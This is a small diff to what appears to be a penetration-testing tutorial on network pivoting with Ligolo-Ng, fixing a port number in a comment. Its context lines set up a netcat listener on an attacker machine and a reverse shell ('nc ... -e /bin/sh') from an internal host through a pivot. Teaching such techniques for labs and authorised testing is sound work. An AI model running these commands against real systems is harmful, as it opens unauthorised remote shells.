@@ -101,7 +101,7 @@ Following the example above, we will create a new listener, but this time we wil
 # Create new listener - Port 1235 on Kali will be the Port 9002 on the Pivot Host A
 # Enter the following on the running active Kali Ligolo-Ng session
 listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:9002
-# Start nc listener on Kali Port 1345
+# Start nc listener on Kali Port 1235
 nc -lvnp 1235
 # Enter the following at Linux CLI on Host B to access the nc listener through Pivot Host A Port 9002
 nc 172.16.150.10 9002 -e /bin/sh
